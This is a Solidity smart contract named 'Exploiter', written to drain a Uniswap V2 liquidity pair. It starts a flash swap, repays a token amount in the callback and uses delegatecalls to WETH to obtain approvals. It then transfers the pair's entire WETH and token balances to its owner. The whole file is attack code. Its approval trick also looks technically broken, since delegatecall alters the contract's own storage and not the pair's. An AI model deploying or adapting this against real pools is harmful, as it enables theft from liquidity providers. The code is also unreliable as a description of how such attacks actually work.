pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function mint(address to) external returns (uint liquidity);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function sync() external;
}

contract Exploiter is Ownable {
    using Address for address;

    address public WETH;
    address public token;
    IUniswapV2Pair uniswapV2Pair;

    constructor(address _WETH, address _pair) {
        WETH = _WETH;
        uniswapV2Pair = IUniswapV2Pair(_pair);
        address token0 = uniswapV2Pair.token0();
        address token1 = uniswapV2Pair.token1();
        require(token0 == WETH || token1 == WETH, "INVALID");
        token = token0 == WETH ? token1 : token0;
    }

    function exploit() external payable onlyOwner {
        (uint256 amount0, uint256 amount1) = uniswapV2Pair.token0() == WETH
            ? (1, 0)
            : (0, 1);
        uniswapV2Pair.swap(amount0, amount1, address(this), bytes("1"));

        uint256 balanceETH = IERC20(WETH).balanceOf(address(uniswapV2Pair));
        uint256 balanceToken = IERC20(token).balanceOf(address(uniswapV2Pair));

        IERC20(WETH).transferFrom(
            address(uniswapV2Pair),
            msg.sender,
            balanceETH
        );
        IERC20(token).transferFrom(
            address(uniswapV2Pair),
            msg.sender,
            balanceToken
        );

        uniswapV2Pair.sync();
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(
            msg.sender == address(uniswapV2Pair) && sender == address(this),
            "FORBIDDEN"
        );
        uint256 amountOut = 1;
        IERC20(WETH).transfer(
            msg.sender,
            (amountOut * 1000) / (amountOut * 997) + 1
        ); // repayment

        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        WETH.functionDelegateCall(approveData); // approve ETH
        WETH.functionDelegateCall( // approve SimpleToken
            abi.encodeWithSignature(
                "transferAndCall(address,uint256,bytes)",
                token,
                0,
                approveData
            )
        );
    }
}
